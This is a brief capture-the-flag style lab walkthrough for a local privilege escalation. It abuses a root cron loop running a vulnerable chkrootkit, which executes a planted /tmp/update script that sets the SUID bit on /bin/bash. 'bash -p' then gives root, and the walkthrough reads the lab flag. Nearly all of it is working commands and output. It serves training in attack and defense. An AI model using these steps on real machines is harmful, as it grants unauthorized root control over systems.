# chkrootkit

Check running services
```
jackie@attackdefense:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
jackie         1  0.0  0.0   4624   800 ?        Ss   09:43   0:00 /bin/sh -c /usr/local/bin/start.sh
jackie         7  0.0  0.0  18372  3084 ?        S    09:43   0:00 /bin/bash /usr/local/bin/start.sh
root          12  0.0  0.0  28352  2584 ?        Ss   09:43   0:00 /usr/sbin/cron
jackie        13  0.1  0.0 138376 21484 ?        Sl   09:43   0:00 ttyd -p 8000 bash
root          19  0.0  0.0   9916  2828 ?        S    09:44   0:00 /bin/bash /bin/check-down
jackie       424  0.0  0.0  18504  3412 pts/0    Ss   09:44   0:00 bash
root         836  0.0  0.0   4528   724 ?        S    09:45   0:00 sleep 60
jackie       837  0.0  0.0  34396  2996 pts/0    R+   09:45   0:00 ps aux
```

Look at `/bin/check-down` - shell script calling chkrootkit periodically
```
jackie@attackdefense:~$ cat /bin/check-down
#!/bin/bash
while :
do
        /usr/local/bin/chkrootkit/chkrootkit -x > /dev/null 2>&1
        sleep 60
done
```

`chkrootkit` priv esc: https://www.exploit-db.com/exploits/33899

Create an `update` file in `/tmp` directory
```
jackie@attackdefense:/tmp$ cat update
#!/bin/bash
chmod u+s /bin/bash
jackie@attackdefense:/tmp$ chmod +x update
jackie@attackdefense:/tmp$ ls -l
total 8
-rw-r--r-- 1 root   root   835 Jun 28 09:51 ps
-rwxr-xr-x 1 jackie jackie  32 Jun 28 09:48 update
```

Wait for a min for chkrootkit to run and set the SETUID bit. Then run bash with effective uid as root
```
jackie@attackdefense:/tmp$ bash -p
bash-4.4# id
uid=1000(jackie) gid=1000(jackie) euid=0(root) groups=1000(jackie)
bash-4.4# cat /root/flag
483ff50857f26f9bd636bed69db8bf8f
```